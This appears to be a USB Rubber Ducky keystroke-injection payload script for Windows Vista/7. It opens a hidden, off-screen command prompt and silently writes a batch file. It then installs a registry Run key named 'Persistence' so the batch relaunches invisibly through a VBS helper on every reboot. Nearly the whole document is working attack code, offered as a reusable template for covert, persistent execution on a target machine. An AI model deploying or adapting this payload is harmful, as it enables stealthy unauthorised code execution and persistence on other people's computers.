REM A generic batch payload with built in persistence via registry key. Only runs as advertized on admin accounts. 

```
REM By overwraith
REM GenericBatch.txt
REM Encoder V2.4
REM Target: WINDOWS VISTA/7 
REM ADMIN PRIVILEGES
REM PURPOSE: to create a script that types in a generic batch file and executes siletntly. 
REM Using the run command for a broader OS base. 
DELAY 3000
GUI r
DELAY 1000
STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
DELAY 500
ENTER
DELAY 750
ALT SPACE
STRING M
DOWNARROW
REPEAT 100
ENTER
REM Make batch file. 
REM Delete batch file if already exists. 
STRING erase /Q batch.bat
ENTER
REM Make the batch file. 
STRING copy con batch.bat
ENTER
REM Registry key that restarts script on reboot. 
STRING REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Persistence /t REG_SZ /d "wscript.exe %TEMP%\invis.vbs %TEMP%\batch.bat" /f
ENTER
REM Copy invis.bat to another location
STRING move invis.vbs %TEMP%
ENTER
REM Copy current program to another location. 
STRING move %0 %TEMP%
ENTER
REM Continue batch file contents here. . . 
CONTROL z
ENTER
REM Make the VBS file that allows running invisibly.
REM Delete vbs file if already exists
STRING erase /Q invis.vbs
ENTER 
REM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
STRING copy con invis.vbs
ENTER
STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
ENTER
CONTROL z
ENTER
STRING wscript.exe invis.vbs batch.bat
ENTER
STRING exit
ENTER
```
